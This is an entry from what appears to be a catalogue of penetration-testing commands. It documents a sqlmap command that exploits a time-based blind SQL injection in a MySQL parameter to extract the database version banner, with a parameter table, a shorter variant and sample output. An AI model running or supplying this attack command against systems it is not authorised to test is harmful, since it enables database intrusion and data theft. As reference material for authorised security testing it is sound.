---
id: cmd-uuid-002
data: >-
  sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner
  --force-ssl --level=5
tags:
  - sqli
  - sqlmap
  - exfiltration
type: command
output: 'banner: ''5.5.62-0ubuntu0.14.04.1'''
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.536Z'
verified: false
validated: true
submitted: true
---
# sqlmap-time-based-sqli-banner-extraction

## Command

```bash
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```

## Description

This sqlmap command exploits a time-based blind SQL injection by loading a request file, targeting the pub_group_id parameter in MySQL, and extracting the database banner using maximum testing level.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-r test.txt` | Load HTTP request from file | Yes |
| `--dbms=mysql` | Specify MySQL backend | Yes |
| `--technique=T` | Use time-based blind technique | Yes |
| `-p pub_group_id` | Test specific parameter | Yes |
| `--banner` | Retrieve DB version banner | Yes |
| `--force-ssl` | Enforce SSL | Yes (for HTTPS) |
| `--level=5` | Maximum testing thoroughness | No |

## Examples

### Basic Usage

```bash
sqlmap.py -r test.txt --technique=T --banner
```

### Advanced Usage

Full command as above for precise MySQL time-based extraction.

## Expected Output

sqlmap outputs the extracted banner, e.g., "banner: '5.5.62-0ubuntu0.14.04.1'", confirming data access.

## Related

- [[Related Procedure: Exploit-SQLi-with-sqlmap-to-Extract-Database-Banner]]
